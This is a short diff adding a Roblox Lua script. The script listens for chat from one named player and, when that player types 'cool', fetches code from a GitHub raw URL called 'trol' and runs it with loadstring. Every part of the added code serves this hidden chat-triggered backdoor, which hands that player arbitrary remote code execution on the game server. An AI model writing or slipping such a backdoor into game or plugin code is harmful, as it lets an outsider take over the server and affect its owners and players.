@@ -1,0 +1,20 @@
+-- listen for chat message from player "JohnRegretevator"
+game.Players.PlayerAdded:Connect(function(player)
+    if player.Name == "JohnRegretevator" then
+        player.Chatted:Connect(function(msg)
+            if msg:lower() == "cool" then
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/Trollingm/emper/refs/heads/main/trol"))()
+            end
+        end)
+    end
+end)
+
+-- also check if JohnRegretevator is already in the game when script runs
+local player = game.Players:FindFirstChild("JohnRegretevator")
+if player then
+    player.Chatted:Connect(function(msg)
+        if msg:lower() == "cool" then
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/Trollingm/emper/refs/heads/main/trol"))()
+        end
+    end)
+end
